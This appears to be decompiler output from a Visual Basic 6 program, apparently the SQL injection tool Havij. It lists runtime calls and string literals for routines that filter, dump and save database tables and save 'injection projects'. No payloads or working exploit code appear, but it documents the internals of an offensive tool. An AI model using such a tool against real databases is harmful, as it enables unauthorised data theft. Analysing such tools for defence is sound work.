'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "%Head%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: "%Data%"
'N  * ref: __vbaStrMove
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaPut3
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarTstLt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaPut3
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: "Can not get all data in one request, lets try one by one"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaOnError
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaI4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaBoolVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaI4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Mid(
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Subr_176
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaI4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "%Head%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: "%Data%"
'N  * ref: __vbaStrMove
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaPut3
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarTstLt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaPut3
'N  * ref: Subr_188
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaI4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "%Head%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: "%Data%"
'N  * ref: __vbaStrMove
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaPut3
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarTstLt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaPut3
'N  * ref: __vbaI4Var
'N  * ref: Subr_188
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaVarForNext
'N  * ref: __vbaPut3
'N  * ref: __vbaPut3
'N  * ref: "Job Canceled!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "I'm IDLE"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFileClose
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCopy
'N  * ref: "Save Tables"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVar
'N  * ref: "Save Data"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaAryDestruct
'N  * ref: __vbaFreeVar
'N  * ref: __vbaAryDestruct
'N  * ref: __vbaFreeStr
'N  * ref: __vbaAryDestruct
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
End Sub
 
Sub tlbTables_ButtonMenuClick(ByVal ButtonMenu As MSComctlLib.ButtonMenu)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaOnError
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: "filter"
'N  * ref: __vbaStrCmp
'N  * ref: Mid(
'N  * ref: "Enter Where condition: Hint: Type columns and table names like this: TableName.Column"
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "Just type condition. Ex. tbl_users.isadmin=1"
'N  * ref: __vbaStrCat
'N  * ref: InputBox(
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: Trim(
'N  * ref: "Filter: "
'N  * ref: "where "
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "start"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaHresultCheckObj
'N  * ref: Mid(
'N  * ref: "Enter start row:"
'N  * ref: __vbaVarDup
'N  * ref: InputBox(
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: IsNumeric(
'N  * ref: __vbaVarCmpLe
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: "Start row must be numerical and bigger than 0"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: "Start Row: "
'N  * ref: __vbaI4ErrVar
'N  * ref: __vbaStrI4
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaI4ErrVar
'N  * ref: "dump"
'N  * ref: __vbaStrCmp
'N  * ref: "All Files (*.*)|*.*"
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: "dump"
'N  * ref: "SaveXML"
'N  * ref: __vbaStrCmp
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate"
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: "XML Files (*.xml)|*.xml"
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: "xml"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_134
'N  * ref: Left(
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "DB:"
'N  * ref: __vbaHresultCheckObj
'N  * ref: "..."
'N  * ref: __vbaVarCat
'N  * ref: IIf(
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
End Sub
 
Sub tmrAfterEdit_Timer()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaVarDup
'N  * ref: "|"
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Split(
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: "|"
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Split(
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: LCase(
'N  * ref: Left(
'N  * ref: "."
'N  * ref: ".."
'N  * ref: "mssql"
'N  * ref: __vbaVarCmpEq
'N  * ref: IIf(
'N  * ref: "INSERT INTO "
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarCat
'N  * ref: IIf(
'N  * ref: "("
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: "("
'N  * ref: __vbaVarCopy
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaI4Var
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: ","
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaI4Var
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: IsNumeric(
'N  * ref: IsNumeric(
'N  * ref: "'"
'N  * ref: IIf(
'N  * ref: "'"
'N  * ref: IIf(
'N  * ref: ","
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaLenBstr
'N  * ref: Left(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: ") VALUES"
'N  * ref: __vbaStrCat
'N  * ref: ")"
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
End Sub
 
Sub tmrAnim_Timer()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: Val(
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrCmp
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaR8Str
'N  * ref: __vbaStrR8
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFPException
End Sub
 
'Sub SaveInjection()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaObjSet
'N  * ref: "Saving Project..."
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFileOpen
'N  * ref: __vbaFileClose
'N  * ref: "Havij Injection Project "
'N  * ref: "1.15"
'N  * ref: __vbaStrCat
'N  * ref: Chr(
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrI4
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrR8
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrUI1
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrUI1
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrR4
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: vbCrLf
'N  * ref: __vbaVarDup
'N  * ref: Join(
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLenBstr
'N  * ref: Left(
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrCat
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFileOpen
'N  * ref: __vbaPut3
'N  * ref: __vbaFileClose
'N  * ref: __vbaObjSet
'N  * ref: "I'm IDLE"
'N  * ref: __vbaHresultCheckObj
'N  * ref: Err
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Can not save the project! "
'N  * ref: __vbaStrCat
'N  * ref: MsgBox
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: "I'm IDLE"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub LoadInjection()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaObjSet
'N  * ref: "Loading Project..."
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: FileLen(
'N  * ref: Space(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFileOpen
'N  * ref: __vbaGet3
'N  * ref: __vbaFileClose
'N  * ref: Chr(
'N  * ref: __vbaVarCat
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: Left(
'N  * ref: __vbaAryUnlock
'N  * ref: "Havij Injection Project"
'N  * ref: __vbaVarTstNe
